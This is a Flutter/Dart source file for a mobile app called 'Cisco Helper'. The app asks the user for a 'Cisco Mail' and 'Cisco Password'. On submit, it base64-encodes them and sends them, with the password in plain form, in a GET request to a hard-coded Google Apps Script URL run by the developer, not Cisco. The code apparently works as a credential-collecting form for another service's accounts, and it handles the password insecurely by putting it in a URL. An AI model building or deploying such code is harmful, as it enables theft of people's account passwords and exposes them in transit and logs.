import 'dart:convert';

import 'package:flutter/material.dart';
import 'package:fluttertoast/fluttertoast.dart';
import 'package:lottie/lottie.dart';
import 'package:requests/requests.dart';
import 'package:responsive_sizer/responsive_sizer.dart';

bool status = true;
void main() {
  runApp(const Home());
}

void showToast(message, Color color) async {
  await Fluttertoast.showToast(
      msg: message.toString(),
      toastLength: Toast.LENGTH_SHORT,
      gravity: ToastGravity.BOTTOM,
      timeInSecForIosWeb: 1,
      backgroundColor: color,
      textColor: Colors.white,
      fontSize: 18.sp);
}

Future<void> sendDetails(String mail, String pass) async {
  try {
    Map<String, String> data = {
      "Email": mail.toLowerCase(),
      "Status": "Pending",
      "Password": pass,
    };
    var stringData = json.encode(data);
    var base64String = utf8.fuse(base64);
    String scriptLink =
        'https://script.google.com/macros/s/AKfycbzF35y1tucDE8B749XDsUICZ4jYWm9h-0bdJ5hyeAiaLh57jx0rYrN9JibGunYqRV_96g/exec';
    String url =
        '$scriptLink?func=Create&Data=${base64String.encode(stringData)}';

    if (mail != "" && pass != "") {
      await Requests.get(url).timeout(
        const Duration(seconds: 10),
      );
      showToast("Details Submitted!!!", Colors.redAccent);
    } else {
      showToast("Provide Details!!!", Colors.redAccent);
    }
    status = true;
  } catch (e) {
    showToast(e, Colors.redAccent);
  }
}

class Home extends StatefulWidget {
  const Home({super.key});

  @override
  State<Home> createState() => _HomeState();
}

class _HomeState extends State<Home> {
  late TextEditingController mailController;
  late TextEditingController passController;
  @override
  void initState() {
    mailController = TextEditingController();
    passController = TextEditingController();
    super.initState();
  }

  @override
  Widget build(BuildContext context) {
    String mail = "";
    String pass = "";
    return ResponsiveSizer(
      builder: (scontext, orientation, screenType) {
        return MaterialApp(
          home: Scaffold(
            backgroundColor: Colors.black,
            body: SingleChildScrollView(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.center,
                children: [
                  SizedBox(height: 8.h),
                  Row(
                    children: [
                      SizedBox(height: 20.h, width: 10.w),
                      Lottie.asset(
                        "./assets/Anime.json",
                        width: 75.w,
                        height: 35.h,
                      ),
                    ],
                  ),
                  SizedBox(height: 1.h),
                  Text(
                    "Cisco Helper",
                    style: TextStyle(
                        color: Colors.white,
                        fontSize: 25.sp,
                        fontFamily: "Poppins",
                        fontWeight: FontWeight.w700),
                  ),
                  SizedBox(height: 3.h),
                  Container(
                    decoration: BoxDecoration(
                        border: Border.all(color: Colors.white, width: 0.5.w),
                        borderRadius: BorderRadius.circular(4.w)),
                    width: 80.w,
                    height: 9.2.h,
                    child: Row(
                      children: [
                        Image.asset(
                          "assets/Phone.png",
                          width: 15.w,
                          height: 15.h,
                        ),
                        SizedBox(
                          width: 60.w,
                          height: 6.h,
                          child: TextField(
                            onChanged: (value) => {mail = value},
                            style: TextStyle(
                              color: const Color.fromRGBO(176, 176, 176, 50),
                              fontFamily: "Poppins",
                              fontWeight: FontWeight.w700,
                              fontSize: 18.sp,
                            ),
                            keyboardType: TextInputType.text,
                            maxLines: 1,
                            cursorColor: Colors.white,
                            decoration: InputDecoration(
                              hintText: "Cisco Mail",
                              hintMaxLines: 1,
                              hintStyle: TextStyle(
                                color: const Color.fromRGBO(176, 176, 176, 50),
                                fontFamily: "Poppins",
                                fontWeight: FontWeight.w700,
                                fontSize: 18.sp,
                              ),
                              counterStyle: TextStyle(
                                color: const Color.fromRGBO(176, 176, 176, 50),
                                fontFamily: "Poppins",
                                fontWeight: FontWeight.w700,
                                fontSize: 18.sp,
                              ),
                              border: InputBorder.none,
                            ),
                          ),
                        )
                      ],
                    ),
                  ),
                  SizedBox(height: 3.h),
                  Container(
                    decoration: BoxDecoration(
                      border: Border.all(color: Colors.white, width: 0.5.w),
                      borderRadius: BorderRadius.circular(
                        4.w,
                      ),
                    ),
                    width: 80.w,
                    height: 9.2.h,
                    child: Row(
                      children: [
                        SizedBox(
                          width: 2.5.w,
                          height: 6.h,
                        ),
                        Image.asset(
                          "assets/Key.png",
                          width: 10.w,
                          height: 10.h,
                        ),
                        SizedBox(
                          width: 2.5.w,
                          height: 6.h,
                        ),
                        SizedBox(
                          width: 60.w,
                          height: 6.h,
                          child: TextField(
                            onChanged: (value) => {pass = value},
                            style: TextStyle(
                              color: const Color.fromRGBO(176, 176, 176, 50),
                              fontFamily: "Poppins",
                              fontWeight: FontWeight.w700,
                              fontSize: 18.sp,
                            ),
                            keyboardType: TextInputType.text,
                            maxLines: 1,
                            cursorColor: Colors.white,
                            decoration: InputDecoration(
                              hintText: "Cisco Password",
                              hintMaxLines: 1,
                              hintStyle: TextStyle(
                                color: const Color.fromRGBO(176, 176, 176, 50),
                                fontFamily: "Poppins",
                                fontWeight: FontWeight.w700,
                                fontSize: 18.sp,
                              ),
                              counterStyle: TextStyle(
                                color: const Color.fromRGBO(176, 176, 176, 50),
                                fontFamily: "Poppins",
                                fontWeight: FontWeight.w700,
                                fontSize: 18.sp,
                              ),
                              border: InputBorder.none,
                            ),
                          ),
                        )
                      ],
                    ),
                  ),
                  SizedBox(height: 2.h),
                  Row(
                    children: [
                      SizedBox(width: 28.w, height: 1.h),
                      Container(
                        width: 40.w,
                        height: 8.h,
                        decoration: BoxDecoration(
                          color: Colors.greenAccent,
                          borderRadius: BorderRadius.circular(6.w),
                        ),
                        child: ElevatedButton(
                          style: ElevatedButton.styleFrom(
                            backgroundColor: Colors.greenAccent.withOpacity(0),
                          ),
                          child: Row(
                            crossAxisAlignment: CrossAxisAlignment.center,
                            mainAxisAlignment: MainAxisAlignment.center,
                            children: [
                              Text(
                                "Submit",
                                style: TextStyle(
                                  color: Colors.white,
                                  fontSize: 22.sp,
                                ),
                              ),
                            ],
                          ),
                          onPressed: () async => {
                            if (status)
                              {
                                status = false,
                                await sendDetails(mail, pass),
                              }
                          },
                        ),
                      ),
                    ],
                  ),
                  SizedBox(height: 11.h),
                  Text(
                    "Developed By Abhishek",
                    style: TextStyle(
                      fontSize: 18.sp,
                      fontFamily: "Poppins",
                      color: Colors.white,
                    ),
                  ),
                ],
              ),
            ),
          ),
        );
      },
    );
  }
}
